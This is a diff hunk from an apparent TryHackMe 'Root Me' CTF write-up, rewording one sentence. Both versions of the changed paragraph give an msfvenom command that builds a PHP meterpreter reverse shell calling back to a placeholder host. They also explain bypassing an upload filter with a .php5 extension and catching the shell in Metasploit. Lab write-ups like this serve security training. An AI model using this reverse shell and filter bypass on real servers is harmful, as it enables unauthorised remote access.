@@ -14,7 +14,7 @@ The output shows us that that there are two hidden directories, panel and upload
 ![panel](https://github.com/nicolai-h/tryhackme/blob/main/root_me/images/panel.png)
 
 ## Getting a shell
-Lets see if we can upload a reverse shell through it. We can create an reverse shell with the command ``` msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php```. When trying to upload our reverse shell we can see that there is an filter in place that does not accept ```.php``` files. We can try to get around the filter by changing the extension to ```.php5```. That worked! Now we can go to <ip>/uploads and run the file while we try to catch the reverse shell. We can catch the reverse shell with metasploit (msfconsole). I used the payload ```php/meterpreter_reverse_tcp```. Set the options LHOST <your ip> and LPORT <choosen port>.
+Lets see if we can upload a reverse shell through the upload form. We can create an reverse shell with the command ``` msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php```. When trying to upload our reverse shell we can see that there is an filter in place that does not accept ```.php``` files. We can try to get around the filter by changing the extension to ```.php5```. That worked! Now we can go to <ip>/uploads and run the file while we try to catch the reverse shell. We can catch the reverse shell with metasploit (msfconsole). I used the payload ```php/meterpreter_reverse_tcp```. Set the options LHOST <your ip> and LPORT <choosen port>.
 
 ![msf](https://github.com/nicolai-h/tryhackme/blob/main/root_me/images/msf.png)
 
